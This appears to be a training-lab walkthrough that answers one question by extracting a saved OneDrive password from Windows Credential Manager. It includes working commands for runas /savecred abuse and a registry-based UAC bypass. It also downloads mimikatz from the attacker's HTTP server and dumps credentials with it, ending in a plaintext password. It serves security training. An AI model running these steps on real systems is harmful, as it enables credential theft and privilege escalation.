### Attacking Windows Credential Manager
 
IP: 10.129.189.142
 
---
 
### Question 1:
What is the password mcharles uses for OneDrive?
 
I start by RDP'ing to the target at 10.129.189.142 with the given credentials.
 
```diff
+ $ xfreerdp /u:sadams /p:totally2brow2harmon@ /v:10.129.189.142
```
 
Once inside, I run a `cmdkey /list` on the sadams user in cmd and see that there's a saved credential for an interactive session for the mcharles user.
 
```diff
+ C:\Users\sadams> cmdkey /list
```
 
Seeing this, I run the runas command, targeting the saved credential and launching cmd.
 
```diff
+ C:\Users\sadams>runas /savecred /user:SRV01\mcharles cmd
```
 
	C:\Windows\system32>
 
This spawns me in a terminal as the user, but although the user is in the system directory, we don't have system privileges, so I utilize a privilege escalation technique to bypass UAC with a computerdefaults reg trick.
 
```diff
+ C:\Windows\system32> reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ /d "" /f && reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /ve /t REG_SZ /d "cmd.exe" /f && start computerdefaults.exe
```
 
	C:\Windows\system32>
 
Now I'm a user with proper privileges to decrypt the stored credentials properly with mimikatz. I download the mimikatz tool on my attack machine and host a Python HTTP server to download it on the victim machine.
 
```diff
+ $ unzip mimikatz_trunk.zip
+ $ python3 -m http.server
```
 
	Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 
On the victim machine, I open PowerShell and run.
 
```diff
+ C:\Users\sadams> (New-Object Net.WebClient).DownloadFile('http://10.10.15.120:8000/mimikatz.exe','C:\Users\sadams\mimikatz.exe')
```
 
Now in my high-privilege terminal, I move the file and run it.
 
```diff
+ C:\Windows\system32> move C:\Users\sadams\mimikatz.exe C:\Windows\system32\mimikatz.exe
+ C:\Windows\system32> mimikatz.exe
+ mimikatz # privilege::debug
+ mimikatz # sekurlsa::credman
```
 
	<snip>
	credman :
 
	[00000000]
	* Username : mcharles@inlanefreight.local
	* Domain   : onedrive.live.com
	* Password : Inlanefreight#2025
	<snip>
 
I can see from the output, the password to the OneDrive is Inlanefreight#2025.
 
&#x1F6A9; found **Inlanefreight#2025**.
 
